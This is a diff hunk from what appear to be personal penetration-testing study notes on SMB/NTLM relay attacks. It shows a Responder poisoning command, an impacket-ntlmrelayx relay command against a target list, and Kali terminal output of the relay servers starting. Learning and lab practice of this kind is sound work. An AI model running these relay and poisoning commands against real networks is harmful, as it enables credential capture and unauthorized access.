@@ -88,10 +88,34 @@ Check if they are off by running the command `sudo responder -I eth0 -dwPv`
 	- If you have pimpmykali installed, just use ntmrelay
 	- If you haven't pimpmykali, you can use the impacket-ntmlrelayx - newer version but not sure if it will work
 
-![[Pasted image 20240714210446.png]]
-
 ```
 impacket-ntlmrelayx -tf targets.txt smb2support
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-ntlmrelayx -tf targets.txt -smb2support
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to hosts in targetfile
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+
 ```
 
 Execute the smb
